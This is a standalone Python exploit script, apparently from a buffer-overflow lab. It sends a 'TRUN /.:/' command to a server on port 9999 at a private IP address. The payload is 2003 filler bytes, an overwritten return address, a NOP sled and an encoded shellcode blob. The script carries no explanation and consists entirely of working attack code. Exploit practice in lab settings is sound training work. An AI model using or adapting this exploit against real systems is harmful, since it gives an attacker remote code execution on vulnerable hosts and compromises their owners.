#!/usr/bin/python

import sys, socket

overflow = (
"\xbf\xc7\x83\x4b\x83\xd9\xc9\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x78\x12\x03\x78\x12\x83\x07\x87\xa9\x76\x7b\x60\xaf"
"\x79\x83\x71\xd0\xf0\x66\x40\xd0\x67\xe3\xf3\xe0\xec\xa1\xff"
"\x8b\xa1\x51\x8b\xfe\x6d\x56\x3c\xb4\x4b\x59\xbd\xe5\xa8\xf8"
"\x3d\xf4\xfc\xda\x7c\x37\xf1\x1b\xb8\x2a\xf8\x49\x11\x20\xaf"
"\x7d\x16\x7c\x6c\xf6\x64\x90\xf4\xeb\x3d\x93\xd5\xba\x36\xca"
"\xf5\x3d\x9a\x66\xbc\x25\xff\x43\x76\xde\xcb\x38\x89\x36\x02"
"\xc0\x26\x77\xaa\x33\x36\xb0\x0d\xac\x4d\xc8\x6d\x51\x56\x0f"
"\x0f\x8d\xd3\x8b\xb7\x46\x43\x77\x49\x8a\x12\xfc\x45\x67\x50"
"\x5a\x4a\x76\xb5\xd1\x76\xf3\x38\x35\xff\x47\x1f\x91\x5b\x13"
"\x3e\x80\x01\xf2\x3f\xd2\xe9\xab\xe5\x99\x04\xbf\x97\xc0\x40"
"\x0c\x9a\xfa\x90\x1a\xad\x89\xa2\x85\x05\x05\x8f\x4e\x80\xd2"
"\xf0\x64\x74\x4c\x0f\x87\x85\x45\xd4\xd3\xd5\xfd\xfd\x5b\xbe"
"\xfd\x02\x8e\x11\xad\xac\x61\xd2\x1d\x0d\xd2\xba\x77\x82\x0d"
"\xda\x78\x48\x26\x71\x83\x1b\x89\x2e\x69\x5b\x61\x2d\x6d\x4d"
"\x2e\xb8\x8b\x07\xde\xec\x04\xb0\x47\xb5\xde\x21\x87\x63\x9b"
"\x62\x03\x80\x5c\x2c\xe4\xed\x4e\xd9\x04\xb8\x2c\x4c\x1a\x16"
"\x58\x12\x89\xfd\x98\x5d\xb2\xa9\xcf\x0a\x04\xa0\x85\xa6\x3f"
"\x1a\xbb\x3a\xd9\x65\x7f\xe1\x1a\x6b\x7e\x64\x26\x4f\x90\xb0"
"\xa7\xcb\xc4\x6c\xfe\x85\xb2\xca\xa8\x67\x6c\x85\x07\x2e\xf8"
"\x50\x64\xf1\x7e\x5d\xa1\x87\x9e\xec\x1c\xde\xa1\xc1\xc8\xd6"
"\xda\x3f\x69\x18\x31\x84\x89\xfb\x93\xf1\x21\xa2\x76\xb8\x2f"
"\x55\xad\xff\x49\xd6\x47\x80\xad\xc6\x22\x85\xea\x40\xdf\xf7"
"\x63\x25\xdf\xa4\x84\x6c")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 90+ overflow
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.226.131',9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
    
except:
    print("Error connecting to server")
    sys.exit()

